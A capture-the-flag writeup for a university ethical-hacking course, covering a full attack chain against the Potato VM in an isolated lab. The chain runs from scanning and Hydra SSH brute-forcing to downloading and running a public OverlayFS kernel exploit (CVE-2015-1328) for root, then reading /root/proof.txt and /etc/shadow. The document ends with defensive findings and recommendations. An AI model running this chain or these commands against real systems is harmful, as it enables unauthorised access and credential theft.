# 🥔 Potato CTF — Privilege Escalation Writeup

![Course](https://img.shields.io/badge/Course-CS4061%20Ethical%20Hacking-blue)
![Type](https://img.shields.io/badge/Type-CTF%20%2F%20Pen%20Test-orange)
![Target](https://img.shields.io/badge/Target-Ubuntu%2014.04-E95420?logo=ubuntu&logoColor=white)
![CVE](https://img.shields.io/badge/CVE-2015--1328-red)
![Result](https://img.shields.io/badge/Result-Root%20%23-brightgreen)
![Status](https://img.shields.io/badge/Flag-Captured-success)

> A full penetration test writeup against the **Potato CTF** virtual machine. The exercise covers the complete attack lifecycle — from host discovery to root shell and flag capture.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Environment Setup](#environment-setup)
- [Repository Structure](#repository-structure)
- [Tools Used](#tools-used)
- [Attack Chain Summary](#attack-chain-summary)
- [Step-by-Step Walkthrough](#step-by-step-walkthrough)
  - [Step 1 — Host Discovery](#step-1--host-discovery-netdiscover)
  - [Step 2 — Port Scanning](#step-2--port-scanning--service-enumeration-nmap)
  - [Step 3 — Web Reconnaissance](#step-3--web-reconnaissance-gobuster--browser)
  - [Step 4 — SSH Brute-Force](#step-4--ssh-credential-brute-forcing-hydra)
  - [Step 5 — Initial Access](#step-5--initial-access-via-ssh)
  - [Step 6 — Privilege Escalation](#step-6--privilege-escalation-cve-2015-1328-overlayfs)
  - [Step 7 — Root & Flag](#step-7--root-access-verification--flag-capture)
- [Findings & Recommendations](#findings--recommendations)
- [Key Takeaways](#key-takeaways)
- [Author](#author)

---

## Overview

This report documents a full penetration test conducted against the **Potato CTF** machine in an isolated VirtualBox lab environment. The target was a deliberately vulnerable Ubuntu 14.04 VM running an outdated kernel, an exposed phpinfo() page, and weak SSH credentials.

The attack chain chains multiple weaknesses together — information disclosure → credential brute-force → kernel exploit — ultimately achieving **full root access** and capturing the proof flag.

---

## Environment Setup

| Component              | Details                       |
| ---------------------- | ----------------------------- |
| **Attacker Machine**   | Kali Linux — VirtualBox VM    |
| **Target Machine**     | Potato CTF — Ubuntu 14.04 LTS |
| **Attacker IP**        | `192.168.163.137`             |
| **Target IP**          | `192.168.163.139`             |
| **Network Mode**       | NAT (Internal)                |
| **VirtualBox Version** | 6.0.24                        |
| **Assessment Date**    | April 29, 2026                |

---

## Repository Structure

```
potato-ctf-privilege-escalation/
│
├── README.md                         # This file — full writeup
│
├── report/
│   ├── 22L-6880_Assignment_3.docx    # Original assignment report (Word)
│   └── 22L-6880_Assignment_3.pdf     # PDF export of full report
│
├── evidence/
│   ├── step1_host_discovery/
│   │   └── 01_netdiscover_target_ip.png
│   │
│   ├── step2_port_scanning/
│   │   └── 02_nmap_scan_port80_port7120.png
│   │
│   ├── step3_web_recon/
│   │   ├── 03_gobuster_directories_infophp_indexhtml.png
│   │   ├── 04_browser_infophp_phpinfo_page.png
│   │   └── 05_browser_indexhtml_potato_title.png
│   │
│   ├── step4_brute_force/
│   │   ├── 06_hydra_brute_force_running.png
│   │   └── 07_hydra_success_credentials.png
│   │
│   ├── step5_initial_access/
│   │   ├── 08_ssh_login_potato_shell.png
│   │   └── 09_whoami_id_uname_output.png
│   │
│   ├── step6_privesc/
│   │   ├── 10_gcc_compilation_exploit_kali.png
│   │   ├── 11_wget_exploit_transfer_target.png
│   │   └── 12_exploit_execution_root_shell.png
│   │
│   └── step7_root_flag/
│       └── 13_root_proof_flag_captured.png
│
├── exploit/
│   ├── 37292.c                       # CVE-2015-1328 OverlayFS exploit source
│   └── README.md                     # Exploit notes and compilation steps
│
└── notes/
    └── recon_notes.md                # Raw recon notes, commands, and outputs
```

---

## Tools Used

| Tool                     | Purpose                             |
| ------------------------ | ----------------------------------- |
| **netdiscover**          | ARP-based host discovery            |
| **Nmap**                 | Port scanning & service enumeration |
| **Gobuster**             | Web directory brute-forcing         |
| **Hydra**                | SSH credential brute-forcing        |
| **Metasploit Framework** | SSH user enumeration (attempted)    |
| **GCC**                  | Exploit compilation                 |
| **Python3 HTTP Server**  | File transfer from Kali to target   |
| **curl / Browser**       | Web reconnaissance                  |

---

## Attack Chain Summary

| #   | Phase                | Tool                  | Result                                     |
| --- | -------------------- | --------------------- | ------------------------------------------ |
| 1   | Host Discovery       | netdiscover           | Target IP identified: `192.168.163.139`    |
| 2   | Port Scanning        | Nmap `-sV -p-`        | Port 80 (HTTP) and Port 7120 (SSH) found   |
| 3   | Web Enumeration      | Gobuster              | `/info.php` and `/index.html` discovered   |
| 4   | Info Disclosure      | Browser / curl        | phpinfo() leaked OS, kernel, PHP version   |
| 5   | Username Discovery   | Web Recon             | Page title `Potato` → username: `potato`   |
| 6   | Credential Attack    | Hydra + fasttrack.txt | SSH password cracked: `letmein`            |
| 7   | Initial Access       | SSH                   | Shell as user `potato` (UID 1000)          |
| 8   | Exploit Prep         | GCC + Python3 HTTP    | `37292.c` compiled & transferred to `/tmp` |
| 9   | Privilege Escalation | CVE-2015-1328         | Root shell `#` obtained                    |
| 10  | Flag Capture         | `cat /root/proof.txt` | ✅ Flag captured                           |

---

## Step-by-Step Walkthrough

### Step 1 — Host Discovery (netdiscover)

**Objective:** Identify the target machine's IP on the virtual network.

```bash
netdiscover
```

netdiscover performs ARP scanning across the local subnet, identifying all live hosts with their MAC addresses and vendor info.

**Result:** Target machine discovered at `192.168.163.139`

📸 `evidence/step1_host_discovery/01_netdiscover_target_ip.png`

---

### Step 2 — Port Scanning & Service Enumeration (Nmap)

**Objective:** Discover all open ports and running services.

```bash
nmap -sV -p- 192.168.163.139
```

Full port scan (`-p-`) with version detection (`-sV`) revealed two critical open ports:

| Port         | Service                           |
| ------------ | --------------------------------- |
| **80/tcp**   | HTTP — Apache 2.0 web server      |
| **7120/tcp** | SSH — OpenSSH (non-standard port) |

📸 `evidence/step2_port_scanning/02_nmap_scan_port80_port7120.png`

---

### Step 3 — Web Reconnaissance (Gobuster + Browser)

**Objective:** Enumerate hidden files/directories and extract system intelligence.

```bash
gobuster dir -u http://192.168.163.139 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
curl http://192.168.163.139/info.php
curl http://192.168.163.139/index.html
```

**Gobuster** revealed two accessible pages: `/info.php` and `/index.html`.

**Critical information extracted from phpinfo():**

| Field                | Value Discovered                      |
| -------------------- | ------------------------------------- |
| **Operating System** | Ubuntu 14.04 LTS                      |
| **Kernel Version**   | Linux 3.13.0-24-generic (Apr 10 2014) |
| **PHP Version**      | 5.5.9-1ubuntu4.29                     |
| **Web Server**       | Apache 2.0 Handler                    |
| **Architecture**     | x86_64                                |

The `index.html` page title `Potato` → strongly implied the system username was `potato`. The kernel version `3.13.0` → immediately flagged as vulnerable to **CVE-2015-1328**.

📸 `evidence/step3_web_recon/03_gobuster_directories_infophp_indexhtml.png`  
📸 `evidence/step3_web_recon/04_browser_infophp_phpinfo_page.png`  
📸 `evidence/step3_web_recon/05_browser_indexhtml_potato_title.png`

---

### Step 4 — SSH Credential Brute-Forcing (Hydra)

**Objective:** Brute-force the SSH password using the discovered username.

> **Note:** Metasploit's `ssh_enumusers` module (CVE-2018-15473) was attempted first but returned false positives on this target. Username was confirmed via web recon instead.

```bash
hydra -l potato -P /usr/share/wordlists/fasttrack.txt -s 7120 ssh://192.168.163.139 -t 16 -V
```

| Field        | Value           |
| ------------ | --------------- |
| **Username** | `potato`        |
| **Password** | `letmein`       |
| **Port**     | `7120`          |
| **Wordlist** | `fasttrack.txt` |

📸 `evidence/step4_brute_force/06_hydra_brute_force_running.png`  
📸 `evidence/step4_brute_force/07_hydra_success_credentials.png`

---

### Step 5 — Initial Access via SSH

**Objective:** Establish an interactive shell using the cracked credentials.

```bash
ssh potato@192.168.163.139 -p 7120
whoami && id && uname -a
```

**Access confirmed:**

- User: `potato` | UID: `1000` (standard user, NOT root)
- Groups: `potato, adm, cdrom, sudo, dip, plugdev`
- `sudo` binary was **not installed** on the system

📸 `evidence/step5_initial_access/08_ssh_login_potato_shell.png`  
📸 `evidence/step5_initial_access/09_whoami_id_uname_output.png`

---

### Step 6 — Privilege Escalation (CVE-2015-1328 OverlayFS)

**Vulnerability:**

| Field        | Details                                           |
| ------------ | ------------------------------------------------- |
| **CVE**      | CVE-2015-1328                                     |
| **Type**     | Linux Kernel OverlayFS Local Privilege Escalation |
| **Affected** | Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04 / 14.04) |
| **Exploit**  | EDB-ID 37292                                      |
| **CVSS**     | 7.2 (HIGH)                                        |

The OverlayFS implementation does not properly check permissions when creating new files in the upper mount layer, allowing an unprivileged user to create root-owned files.

**Step 6.1 — Compile exploit on Kali:**

```bash
mkdir /root/exploit && cd /root/exploit
cp /usr/share/exploitdb/exploits/linux/local/37292.c .
gcc 37292.c -o exploit -D_GNU_SOURCE -w -static
```

> `-static` embeds all library dependencies to resolve GLIBC version mismatches between Kali and the older target.

📸 `evidence/step6_privesc/10_gcc_compilation_exploit_kali.png`

**Step 6.2 — Transfer to target:**

```bash
# On Kali
python3 -m http.server 8080

# On Target
cd /tmp
wget http://192.168.163.138:8080/exploit
chmod +x exploit
```

📸 `evidence/step6_privesc/11_wget_exploit_transfer_target.png`

**Step 6.3 — Execute:**

```bash
./exploit
```

```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
#
```

The `#` prompt confirms a **root shell** was obtained.

📸 `evidence/step6_privesc/12_exploit_execution_root_shell.png`

---

### Step 7 — Root Access Verification & Flag Capture

```bash
whoami && id && hostname && ifconfig
cat /root/proof.txt
cat /etc/shadow
```

**🚩 Flag Captured:**

```
SunCSR.Team.Potato.af6d45da1f1181347b9e2139f23c6a5b
```

📸 `evidence/step7_root_flag/13_root_proof_flag_captured.png`

---

## Findings & Recommendations

| #   | Finding                                                                 | Severity    | Recommendation                                                                            |
| --- | ----------------------------------------------------------------------- | ----------- | ----------------------------------------------------------------------------------------- |
| 1   | **Outdated OS / Kernel** (Ubuntu 14.04, Kernel 3.13.0 — EOL since 2019) | 🔴 Critical | Upgrade to Ubuntu 22.04 or 24.04 LTS. Implement automated patch management.               |
| 2   | **CVE-2015-1328 OverlayFS** — local privesc to root                     | 🔴 Critical | Apply kernel security patches. Upgrade to kernel ≥ 3.19. Implement AppArmor/SELinux.      |
| 3   | **phpinfo() Exposed** at `/info.php`                                    | 🟠 High     | Remove all phpinfo() files from web servers. Never expose system config in production.    |
| 4   | **Weak SSH Credentials** — cracked in under 5 minutes                   | 🟠 High     | Enforce strong passwords. Use key-based SSH auth. Disable password auth. Deploy fail2ban. |
| 5   | **Information Disclosure via index.html** — leaked username             | 🟡 Medium   | Avoid page titles or content that reveal system usernames or machine names.               |

---

## Key Takeaways

- **Defense in depth is essential** — no single vulnerability enabled root access; the chain required multiple weak controls to be present simultaneously.
- **Patch management is critical** — a kernel from 2014 enabled root access via a well-known, publicly documented CVE.
- **Information disclosure accelerates attacks** — phpinfo() cut reconnaissance time significantly and directly guided exploit selection.
- **Non-standard ports provide no security** — SSH on port 7120 was still discovered via a full Nmap scan.
- **Credential security matters** — the password `letmein` was cracked in minutes from a standard wordlist.

---

## Author

**Mamoon Ahmad**

[![Email](https://img.shields.io/badge/Email-mamoonahmad.dev%40gmail.com-D14836?logo=gmail&logoColor=white)](mailto:mamoonahmad.dev@gmail.com)
[![GitHub](https://img.shields.io/badge/GitHub-maamooon-181717?logo=github)](https://github.com/maamooon)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-maamooon-0A66C2?logo=linkedin)](https://linkedin.com/in/maamooon)

---

> **Disclaimer:** This exercise was conducted in a fully isolated, controlled VirtualBox lab environment for educational purposes. No real systems were targeted.
